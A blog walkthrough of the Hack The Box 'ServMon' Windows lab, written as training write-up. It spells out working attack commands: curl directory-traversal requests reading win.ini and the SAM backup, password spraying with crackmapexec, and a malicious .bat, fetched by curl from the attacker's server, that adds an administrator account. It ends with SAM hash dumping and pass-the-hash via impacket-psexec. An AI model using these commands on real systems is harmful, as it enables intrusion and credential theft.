---
layout: post
title:  "ServMon Writeup - Hack The Box"
date:   2025-08-24
desc: ""
keywords: "HTB,eWPT,OSCP,Windows,NVMS-1000 Exploitation,Directory Traversal,LFI,Local Port Forwarding,NSClient++ Exploitation,Easy"
categories: [HTB]
tags: [HTB,eWPT,OSCP,Windows,NVMS-1000 Exploitation,Directory Traversal,LFI,Local Port Forwarding,NSClient++ Exploitation,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

The next box I choose to continue my practice on the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform is **ServMon**, whose complexity is rated as **Easy**, but again I disagree with this evaluation because it took me a long time to research and exploit different vulnerabilities. But I always say that it is **very subjective** when evaluating each box; perhaps for users with a lot of knowledge, they turn out to be **easy** machines to work with. What I can say for sure is that I learn a lot and have even more fun with machines that have a **Windows** operating system. It's time to spawn the lab and start my writeup.

<br /><br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I begin to apply the methodology as I do in every **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab I confront, but first I check with `ping` to see if the connection to the machine through the **VPN** is already established, and with the **[hack4u community's](https://hack4u.io/){:target="_blank"}** whichSystem.py tool, I know with a high degree of certainty that the machine's operating system is **Windows** (taking advantage of the **TTL** value). Now I can start the **Reconnaissance** phase, the most important part of pentesting, and I use `nmap` to list the machine's exposed ports. I also take advantage of this tool's custom scripts to leak information about the services and their versions implemented on each open port. I'm already finding very important information, such as the ability to connect anonymously via the **FTP** protocol, in addition to the web services available on ports **80** and **8443**.

```bash
ping -c 2 10.10.10.184
whichSystem.py 10.10.10.184
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.184 -oG allPorts
nmap -sCV -p21,22,80,135,139,445,5666,6063,6699,8443,49666,49668,49669 10.10.10.184 -oN targeted
cat targeted
# Anonymous FTP login allowed
# window.location.href = "Pages/login.htm";
# 5666/tcp  open  tcpwrapped
# 6063/tcp  open  x11?
# 6699/tcp  open  napster?
# 8443/tcp  open  ssl/https-alt
```

<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once I'm able to connect via **FTP** without needing a password, I find two personal directories belonging to **Nadine** and **Nathan's** accounts, as well as some text files that I immediately download to my machine. I try to upload a test file to the server, but I don't have the necessary privileges. In one of the files, I find some **clues** that will most likely help me in my engagement. My next step is to analyze the **SMB** protocol with `crackmapexec` to leak information not only from this protocol but also from the operating system, one thing I will keep in mind is that the service is **not signed**, which could make it vulnerable to an **[SMB relay attack](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html?highlight=smb%20relay#smb-relay-attack){:target="_blank"}**. I try to connect with `rpcclient` through the **Windows RPC** protocol, but I need valid credentials to do so, I have no luck with `smbclient` or `smbmap` either. So I'm going to focus on web services. The first thing is to disclose the technology stacks behind each web application with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**, which leaks information about what is implemented, on port **80** there is an **NVMS-1000** and on port **8443** there is **NSClient++**.

> **[SMB relay attack](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html?highlight=smb%20relay#smb-relay-attack){:target="_blank"}**: This attack uses the **Responder** toolkit to capture **SMB** authentication sessions on an internal network, and relays them to a target machine. If the authentication session is successful, it will automatically drop you into a system shell.

> **[SMB-Scanning](https://www.vectra.ai/modern-attack/attack-techniques/smb-scanning){:target="_blank"}**: With this technique, attackers take advantage of the **SMB protocol's** built-in trust in network users. The attacker uses scanning to identify available accounts to target, then intercepts and manipulates a valid authentication session. By capturing and relaying authentication traffic, the attacker **impersonates** the user to gain unauthorized access.

> **NVMS-1000** is **CMS software** that is specially designed for **network video surveillance** using our **Pro Series DVRs**. Once installed the super administrator can control all Pro Series cameras to monitor live video, record video, playback video, and backup video right from your PC.

> **NSClient++** is a **Windows monitoring agent** that is capable of monitoring Windows laptops, workstations, and servers. It can run monitoring plugins to monitor metrics, processes, and services and it can execute event handlers to restart failed services.

```bash
ftp 10.10.10.184 21
  dir
  ...
  prompt off
  mget Confidential.txt
  mget "Notes to do.txt"

echo "oldboy was here" > test.txt
  put test.txt

cat Confidential.txt
cat Notes\ to\ do.txt

crackmapexec smb 10.10.10.184
# signing:False

rpcclient -U "" 10.10.10.184 -N
smbclient -L 10.10.10.184 -N
smbmap -H 10.10.10.184 -u "null" --no-banner

whatweb http://10.10.10.184 https://10.10.10.184:8443
# NSClient++

# http://10.10.10.184/Pages/login.htm
# https://10.10.10.184:8443/index.html
```

<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I search the internet with a search engine for the default credentials to access the **NVMS-1000** administration panel, but they don't work. With `searchsploit`, I find that the **NVMS-1000** web tool is likely vulnerable to an **[LFI](https://www.invicti.com/learn/local-file-inclusion-lfi/){:target="_blank"}**, and I also have two exploits that I can analyze or download from the local **Exploit-DB** database to use. Just by analyzing the exploit code, I see that it can be exploited manually since it is not very complex, so I use `curl` to perform an **[LFI](https://www.invicti.com/learn/local-file-inclusion-lfi/){:target="_blank"}** and the results are positive as I begin to **[leak sensitive information from the Windows system](https://hakluke.medium.com/sensitive-files-to-grab-in-windows-4b8f0a655f40){:target="_blank"}**. I also remember the information from the text file I had downloaded and look for the **NSClient++** access password in **nathan's** personal directory. I'm lucky and find a list of passwords, which I immediately save. With `searchsploit`, I can perform a brute force attack to verify if one of these passwords is valid, but it tells me that it is not, even when I try with the username **nadine**. For some reason, I need to create a dictionary with the usernames to use in the brute force attack, so that if I succeed in finding a valid password.

```bash
# http://10.10.10.184/Pages/login.htm
# admin:123456      :(

searchsploit nvms 1000
searchsploit -x hardware/webapps/47774.txt
curl -s -X GET "http://10.10.10.184/Pages/login.htm/../../../../../../../../../windows/win.ini" --path-as-is
curl -s -X GET "http://10.10.10.184/Pages/login.htm/../../../../../../../../../windows/system32/drivers/etc/hosts" --path-as-is

curl -s -X GET "http://10.10.10.184/Pages/login.htm/../../../../../../../../../windows/System32/config/RegBack/SAM" --path-as-is
curl -s -X GET "http://10.10.10.184/Pages/login.htm/../../../../../../../../../windows/system32/drivers/etc/networks" --path-as-is

curl -s -X GET "http://10.10.10.184/Pages/login.htm/../../../../../../../../../Users/nathan/desktop/Passwords.txt" --path-as-is
curl -s -X GET "http://10.10.10.184/Pages/login.htm/../../../../../../../../../Users/nathan/desktop/Passwords.txt" --path-as-is > Passwords.txt

for password in $(cat Passwords.txt); do crackmapexec smb 10.10.10.184 -u nathan -p $password; done
for password in $(cat Passwords.txt); do crackmapexec smb 10.10.10.184 -u nadine -p $password; done

nvim Users.txt
cat Users.txt
crackmapexec smb 10.10.10.184 -u Users.txt -p Passwords.txt
```

<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

My credentials do not allow me to enumerate the system with `rpcclient`, or to access private shared resources with `smbclient` or `smbmap`, but I remember that the **SSH** service is available. The great `crackmapexec` tool also allows me to perform a brute force attack to check if any of the credentials are valid for connecting via the **SSH** protocol. After a short wait, `crackmapexec` finds one that allows me to connect to the **Windows system** with the **nadine** account and access the first flag.

```bash
rpcclient -U "nadine%L...k" 10.10.10.184
  enumdomusers
  enumdomgroups
  quit
smbclient -L 10.10.10.184 -U "nadine"
smbmap -H 10.10.10.184 -u "nadine" -p "L...k" --no-banner

crackmapexec ssh 10.10.10.184 -u Users.txt -p Passwords.txt
ssh nadine@10.10.10.184
```

<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With my first enumeration commands, I don't find much relevant information at the moment, but if I list all the open ports on the machine, I notice and remember the port **8443** and its **NSClient++** service, which I cannot access correctly from my browser (**It was locked**). I search the directory where all the files for this web tool are located to find some valuable information, but the most interesting items are some **SSL certificates** that I don't think will be of much help to me at the moment. To access the service on port **8443** locally, I'm going to perform **[Local Port Forwarding with SSH](https://iximiuz.com/en/posts/ssh-tunnels/){:target="_blank"}**, but I still can't access the service from my browser.

> **Local Port Forwarding**: There might be a service listening on localhost or a private interface of a machine that I can only **SSH** to via its public IP. And I desperately need to access this port from the outside.

- ssh -L [local_addr:]local_port:remote_addr:remote_port [user@]sshd_addr

> **Remote Port Forwarding**: When you want to momentarily expose a local service to the outside world. Of course, for that, you'll need a public-facing ingress gateway server. Any public-facing server with an **SSH daemon** on it can be used as such a gateway.

- ssh -R [remote_addr:]remote_port:local_addr:local_port [user@]gateway_addr

```bash
cls
netstat -ano
tasklist
cd C:\
cd PROGRA~1
cd C:\PROGRA~1\NSClient++\security

ssh nadine@10.10.10.184 -L 8443:10.10.10.184:8443
lsof -i:8443
# https://localhost:8443/index.html
```

<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I realize that I'm configuring **Local Port Forwarding** incorrectly with `ssh`, so once I correct my mistake, I can access the **NSClient++** tool as if I were doing so locally from the victim machine. With `searchsploit`, I look for a vulnerability for this tool although I don't know the version, and I find one that would allow me to **Escalate privileges**. I analyze the **ExploitDB** database exploit and learn that I can access the **administrator** password if the **NSClient++ web server** is enabled, but I also have all the steps I need to follow to finish engaging the box.

```bash
ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
lsof -i:8443
# https://localhost:8443/index.html#/

searchsploit nsclient
searchsploit -x 46802.txt
```

<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to try to **Escalate privileges** manually by following the script I just found with `searchsploit`. The first step is to use the `nscp` tool to obtain the **administrator** password and access the **NSClient++** administration panel. The second step is to access the **Settings** tab, where I'm asked to authenticate myself. The third step is to use the **External Scripts** option and add a new one, now I just need to assign a name to the **key**, and I can specify the execution of a command (very complex due to the use of **Local Port Forwarding**) or script in the **value** field.

```cmd
# run the following that is instructed when you select forget password
nscp web -- password --display
# Current password: ew...OT

# https://localhost:8443/index.html
# https://localhost:8443/index.html#/settings

# https://localhost:8443/index.html#/settings/settings/external scripts
# :) All OK
# settings --> external scripts --> scripts --> Add new
# Malicious command or file
```

<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to create a malicious **.bat** file and transfer it to the victim machine, injecting the necessary commands that will create a **new account** and add it to the **administrators group**. Now I can return to the **NSClient++** dashboard and finish configuring the new malicious script. All I need to do is enter the absolute path where the file with the instructions that will allow me to **escalate privileges**, is stored. I save the changes I have made and reload the web application, in the **Queries** tab, I see that a new query has been generated. Finally, I use `net` to verify that the account has been created, but I have **not succeeded** in adding it to the **administrators group**.

> **Attacker Machine**:

```bash
nvim pwn3d.bat
cat !$
```

> **pwn3d.bat**:

```bat
@echo off
net user oldb0y oldboy123!$ /add
net localgroup "Administrator" oldb0y /add
```

```bash
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
curl http://10.10.14.3/pwn3d.bat -o pwn3d.bat

# c:/windows/temp/privesc/pwn3d.bat
# Changes --> Save configuration
# Control --> Reload
# Queries                               :)

net user
net user oldb0y
# :)
net localgroup
# :(
```

<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I realized the **silly** mistake I made in the syntax of the last command of the malicious **.bat** script (the **group name**), so after correcting it and transferring it back to the target machine, I tried to reload the web application to run the query again, but the changes were **not made**. I'd better add a **new malicious script**, save the changes, and reload the application. This time, I can see with `net` that the account has been added to the **administrators group**.

> **Attacker Machine**:

```bash
nvim pwn3d.bat
cat !$
```

> **pwn3d.bat**:

```bat
@echo off
net localgroup "Administrators" oldb0y /add
```

```bash
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
erase pwn3d.bat
curl http://10.10.14.3/pwn3d.bat -o pwn3d.bat

# Control --> Reload
net user oldb0y
# :(

# All back :)
net user oldb0y
# :)
```

<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I validate with `crackmapexec` that the account allows me to log in as an administrator, and the next thing I do is dump the hashes of the Workstation accounts. With `impacket-psexec`, I perform a **Pass-The-Hash** attack using the **Administrator** account hash, and I can now access the last flag. Finally, I have succeeded in completing the engagement of the **ServMon** box.

```bash
crackmapexec smb 10.10.10.184 -u oldb0y -p 'oldboy123!$'
# Pwn3d!
crackmapexec smb 10.10.10.184 -u oldb0y -p 'oldboy123!$' --sam

impacket-psexec WORKGROUP/administrator@10.10.10.184 -hashes aa...ee:c8...ee
# :)
```

<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another excellent **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab that I completed, in which I continue to learn and improve techniques that I didn't know before, because there are countless technologies that one can attack to check whether or not they have vulnerabilities. This machine made me realize that there are many attack vectors that can be exploited if the tools used in a work environment are not properly configured or updated to the latest version. I would like to emphasize again that **[Hack The Box's](https://www.hackthebox.com){:target="_blank"}** **Windows** machines are my weakness and the ones that captivate and entertain me the most. Now I'm going to kill this box to continue my learning with another one.

<br /><br />
<img src="{{ site.img_path }}/servmon_writeup/ServMon_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
